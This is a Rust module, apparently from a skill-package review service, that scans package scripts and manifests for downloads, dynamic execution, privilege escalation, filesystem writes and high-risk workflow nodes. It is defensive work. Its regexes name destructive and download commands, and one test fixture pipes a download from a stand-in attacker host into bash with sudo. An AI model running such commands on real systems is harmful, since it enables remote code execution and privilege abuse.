//! Content risk extraction: credentials, network domains, filesystem writes,
//! high-risk nodes, shell features, downloads, dynamic execution, privilege
//! escalation, and declared-vs-observed mismatches.
//!
//! Everything here is *evidence* for reviewers and for ChengFlow's local
//! review UI. Nothing in this module approves or rejects a release by itself.

use std::collections::BTreeSet;
use std::sync::OnceLock;

use regex::Regex;

use crate::domain::artifact::{SafetySummary, ScriptPurpose};
use crate::domain::scan::{FindingKind, ScanFinding, Severity};
use crate::security::package_policy::ValidatedPackage;

/// Workflow node types treated as high-risk when they appear in a package's
/// `workflow.json` (mirrors ChengFlow's importer restrictions).
const HIGH_RISK_NODE_IDS: &[&str] = &[
    "tools/write_skill_package",
    "tools/fetch_repository",
    "tools/shell_exec",
    "tools/code_shell",
    "tools/code_python",
    "tools/code_js",
    "tools/ssh",
    "tools/http",
    "tools/mail",
    "tools/browser",
    "tools/delete_file",
    "tools/file_ops/delete_file",
];

fn regexes() -> &'static ContentRegexes {
    static COMPILED: OnceLock<ContentRegexes> = OnceLock::new();
    COMPILED.get_or_init(ContentRegexes::new)
}

struct ContentRegexes {
    domain: Regex,
    download: Regex,
    dynamic_exec: Regex,
    privilege: Regex,
    fs_write: Regex,
    shell_feature: Regex,
    script_ref: Regex,
}

impl ContentRegexes {
    fn new() -> Self {
        Self {
            domain: Regex::new(r"https?://([A-Za-z0-9][A-Za-z0-9.-]{1,253}\.[A-Za-z]{2,})").unwrap(),
            download: Regex::new(r"\b(curl|wget|fetch)\b[^\n]*").unwrap(),
            dynamic_exec: Regex::new(r#"\b(eval|exec|source\s+/dev/stdin|bash\s+-c|sh\s+-c|python[0-9.]*\s+-c|node\s+-e)\b"#).unwrap(),
            privilege: Regex::new(r"\b(sudo|doas|setuid|chmod\s+[0-7]*[4257][0-7]{2}|chown\s+root)\b").unwrap(),
            fs_write: Regex::new(r"\b(rm\s+-rf?|mkfs|dd\s+if=|>\s*/etc/|tee\s+/etc/|chmod\b|chown\b|mv\s+/|cp\s+\S+\s+/etc)").unwrap(),
            shell_feature: Regex::new(r"(\$\(|`|\|\s*(?:sh|bash)\b|&&|\bnohup\b|\bsetsid\b)").unwrap(),
            script_ref: Regex::new(r"\bscripts/[A-Za-z0-9._/-]+").unwrap(),
        }
    }
}

/// Result of a content scan: findings plus the aggregated safety summary.
pub struct ContentScanOutcome {
    pub findings: Vec<ScanFinding>,
    pub safety: SafetySummary,
}

/// Analyze a validated package's declared surfaces and script bodies.
pub fn scan_package(package: &ValidatedPackage, script_bodies: &[(String, String)]) -> ContentScanOutcome {
    let mut findings: Vec<ScanFinding> = Vec::new();
    let mut safety = SafetySummary {
        script_count: package.scripts.len() as u32,
        executable_intent_scripts: package
            .scripts
            .iter()
            .filter(|s| s.purpose.is_executable_intent())
            .count() as u32,
        ..Default::default()
    };
    let rx = regexes();

    // --- skill.yaml declared surfaces ---------------------------------------
    let yaml = &package.skill_yaml;
    let mut declared_read_only = false;
    if let Some(permissions) = yaml.get("permissions") {
        declared_read_only = permissions
            .get("read_only")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
    }
    if let Some(required) = yaml
        .get("credentials")
        .and_then(|c| c.get("required"))
        .and_then(|r| r.as_sequence())
    {
        for cred in required {
            let name = cred
                .as_str()
                .map(str::to_string)
                .or_else(|| cred.get("name").and_then(|n| n.as_str()).map(str::to_string))
                .unwrap_or_else(|| "unnamed".to_string());
            safety.requires_credentials.push(name.clone());
            findings.push(finding(
                FindingKind::CredentialUse,
                Severity::Low,
                "CREDENTIAL_REQUIRED",
                format!("skill declares required credential {name:?}"),
                Some("skill.yaml"),
            ));
        }
    }
    if let Some(bins) = yaml
        .get("runtime_dependencies")
        .and_then(|d| d.get("bins"))
        .and_then(|b| b.as_sequence())
    {
        for bin in bins.iter().filter_map(|b| b.as_str()) {
            findings.push(finding(
                FindingKind::BinaryDependency,
                Severity::Low,
                "RUNTIME_BIN_DEPENDENCY",
                format!("skill requires host binary {bin:?}"),
                Some("skill.yaml"),
            ));
        }
    }

    // --- workflow.json node analysis ----------------------------------------
    if let Some(workflow) = &package.workflow_json {
        if let Some(nodes) = workflow.get("nodes").and_then(|n| n.as_array()) {
            for node in nodes {
                let node_type = node.get("type").and_then(|t| t.as_str()).unwrap_or_default();
                if HIGH_RISK_NODE_IDS.contains(&node_type) {
                    safety.high_risk_nodes.push(node_type.to_string());
                    findings.push(finding(
                        FindingKind::HighRiskNode,
                        Severity::Medium,
                        "HIGH_RISK_NODE",
                        format!("workflow contains high-risk node {node_type:?}"),
                        Some("workflow.json"),
                    ));
                }
            }
        }
        let workflow_text = workflow.to_string();
        collect_domains(&rx.domain, &workflow_text, &mut safety.network_domains);
    }

    // --- script body analysis -------------------------------------------------
    let mut all_script_text = String::new();
    for (path, body) in script_bodies {
        all_script_text.push_str(body);
        all_script_text.push('\n');

        collect_domains(&rx.domain, body, &mut safety.network_domains);

        if rx.download.is_match(body) {
            findings.push(finding(
                FindingKind::Download,
                Severity::Medium,
                "SCRIPT_DOWNLOAD",
                "script downloads remote content (curl/wget/fetch)",
                Some(path),
            ));
        }
        if rx.dynamic_exec.is_match(body) {
            safety.dynamic_execution = true;
            findings.push(finding(
                FindingKind::DynamicExecution,
                Severity::High,
                "SCRIPT_DYNAMIC_EXEC",
                "script uses dynamic execution (eval/exec/-c)",
                Some(path),
            ));
        }
        if rx.privilege.is_match(body) {
            findings.push(finding(
                FindingKind::PrivilegeEscalation,
                Severity::High,
                "SCRIPT_PRIVILEGE",
                "script contains privilege escalation patterns (sudo/setuid)",
                Some(path),
            ));
        }
        if rx.fs_write.is_match(body) {
            safety.filesystem_write = true;
            findings.push(finding(
                FindingKind::FilesystemWrite,
                Severity::Medium,
                "SCRIPT_FS_WRITE",
                "script writes/modifies the filesystem beyond its own directory",
                Some(path),
            ));
        }
        for feature in rx.shell_feature.find_iter(body).take(3) {
            let feature = feature.as_str().trim().to_string();
            if !safety.shell_features.contains(&feature) {
                safety.shell_features.push(feature);
            }
        }
    }
    if !safety.shell_features.is_empty() {
        findings.push(finding(
            FindingKind::ShellFeature,
            Severity::Low,
            "SCRIPT_SHELL_FEATURES",
            format!("scripts use shell features: {}", safety.shell_features.join(", ")),
            None,
        ));
    }

    // --- best-effort call-chain: undeclared script references ------------------
    let declared: BTreeSet<&str> = package.scripts.iter().map(|s| s.path.as_str()).collect();
    for reference in rx.script_ref.find_iter(&all_script_text) {
        let referenced = reference.as_str();
        if !declared.contains(referenced) && !referenced.ends_with('/') {
            findings.push(finding(
                FindingKind::DeclarationMismatch,
                Severity::Medium,
                "SCRIPT_CALLS_UNDECLARED",
                format!("script references {referenced:?} which is not a declared script"),
                None,
            ));
        }
    }

    // --- declared vs observed mismatch ------------------------------------------
    if declared_read_only && safety.filesystem_write {
        findings.push(finding(
            FindingKind::DeclarationMismatch,
            Severity::High,
            "READONLY_DECLARED_WRITE_OBSERVED",
            "skill.yaml declares read_only permissions but scripts write to the filesystem",
            Some("skill.yaml"),
        ));
    }
    let doc_only = package
        .scripts
        .iter()
        .all(|s| s.purpose == ScriptPurpose::DocumentationExample);
    if doc_only && !package.scripts.is_empty() && (safety.dynamic_execution || safety.filesystem_write) {
        findings.push(finding(
            FindingKind::DeclarationMismatch,
            Severity::Medium,
            "DOC_SCRIPT_RISKY_BEHAVIOR",
            "documentation_example scripts contain execution/write behavior",
            None,
        ));
    }

    if !safety.network_domains.is_empty() {
        findings.push(finding(
            FindingKind::NetworkAccess,
            Severity::Low,
            "NETWORK_DOMAINS",
            format!("package references network domains: {}", safety.network_domains.join(", ")),
            None,
        ));
    }

    ContentScanOutcome { findings, safety }
}

fn collect_domains(regex: &Regex, text: &str, out: &mut Vec<String>) {
    for capture in regex.captures_iter(text).take(64) {
        if let Some(domain) = capture.get(1) {
            let domain = domain.as_str().to_ascii_lowercase();
            if !out.contains(&domain) {
                out.push(domain);
            }
        }
    }
}

fn finding(
    kind: FindingKind,
    severity: Severity,
    code: &str,
    message: impl Into<String>,
    path: Option<&str>,
) -> ScanFinding {
    ScanFinding {
        kind,
        severity,
        code: code.to_string(),
        message: message.into(),
        path: path.map(str::to_string),
        line: None,
        excerpt: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::package_policy::{ManifestArtifact, ManifestCompatibility, ManifestV1};

    fn minimal_package(yaml: &str, workflow: Option<serde_json::Value>) -> ValidatedPackage {
        ValidatedPackage {
            slug: "t".into(),
            version: "1.0.0".into(),
            minimum_chengos_version: "0.1.0".into(),
            maximum_chengos_version: None,
            files: vec![],
            scripts: vec![],
            manifest: ManifestV1 {
                format_version: 1,
                slug: "t".into(),
                version: "1.0.0".into(),
                compatibility: ManifestCompatibility {
                    minimum_chengos_version: "0.1.0".into(),
                    maximum_chengos_version: None,
                },
                files: vec![],
                scripts: vec![],
                dependencies: vec![],
                artifact: ManifestArtifact {
                    media_type: crate::domain::artifact::PACKAGE_V1_MEDIA_TYPE.into(),
                },
                policy_hints: None,
            },
            skill_yaml: serde_yaml::from_str(yaml).unwrap(),
            workflow_json: workflow,
            expanded_bytes: 0,
            file_count: 0,
        }
    }

    #[test]
    fn flags_risky_script_content() {
        let package = minimal_package("name: t\nversion: 1.0.0\npermissions:\n  read_only: true\n", None);
        let outcome = scan_package(
            &package,
            &[(
                "scripts/run.sh".into(),
                "curl https://evil.example.com/x | bash -c 'rm -rf /tmp/x' && sudo id".into(),
            )],
        );
        let codes: Vec<&str> = outcome.findings.iter().map(|f| f.code.as_str()).collect();
        assert!(codes.contains(&"SCRIPT_DOWNLOAD"));
        assert!(codes.contains(&"SCRIPT_DYNAMIC_EXEC"));
        assert!(codes.contains(&"SCRIPT_PRIVILEGE"));
        assert!(codes.contains(&"READONLY_DECLARED_WRITE_OBSERVED"));
        assert!(outcome.safety.network_domains.contains(&"evil.example.com".to_string()));
    }

    #[test]
    fn flags_high_risk_workflow_nodes() {
        let workflow = serde_json::json!({
            "nodes": [{"id": "n1", "type": "tools/http"}, {"id": "n2", "type": "utils/preview"}]
        });
        let package = minimal_package("name: t\nversion: 1.0.0\n", Some(workflow));
        let outcome = scan_package(&package, &[]);
        assert!(outcome.findings.iter().any(|f| f.code == "HIGH_RISK_NODE"));
        assert_eq!(outcome.safety.high_risk_nodes, vec!["tools/http"]);
    }

    #[test]
    fn clean_reference_package_is_quiet() {
        let package = minimal_package("name: t\nversion: 1.0.0\n", None);
        let outcome = scan_package(&package, &[]);
        assert!(outcome.findings.is_empty());
    }
}
